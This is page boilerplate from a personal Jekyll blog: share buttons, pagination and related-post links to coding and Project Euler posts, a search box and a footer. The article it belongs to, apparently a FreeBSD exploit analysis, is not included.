  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Ffreebsd-mmap-ptrace-privilege-escalation-exploit-analysis%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Ffreebsd-mmap-ptrace-privilege-escalation-exploit-analysis%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/sum-square-difference/" class="pagination--pager" title="Sum Square Difference
">Previous</a>
    
    
      <a href="/10001st-prime-number/" class="pagination--pager" title="10001st Prime Number
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You May Also Enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/what-is-wrong-with-microservice/" rel="permalink">What is wrong with microservice
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  less than 1 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">Welcome

</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/clean-code-tips-and-tricks-introduction-variables/" rel="permalink">Clean Code Tips and Tricks: Introduction &amp; Variables
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  11 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">I recently organized a workshop for my team members to talk about Clean Code. It
has been a major issue plaguing the team and has been slowing us down by
gen...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/largest-product-in-a-series/" rel="permalink">Largest Product In A Series
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  1 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  Find the greatest product of five consecutive digits in the 1000-digit number.


</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/10001st-prime-number/" rel="permalink">10001st Prime Number
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  2 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  By listing the first six prime numbers: 2, 3, 5, 7, 11, and 13, we can see
that the 6th prime is 13. What is the 10001st prime number?


</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2019 Hai Lang. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
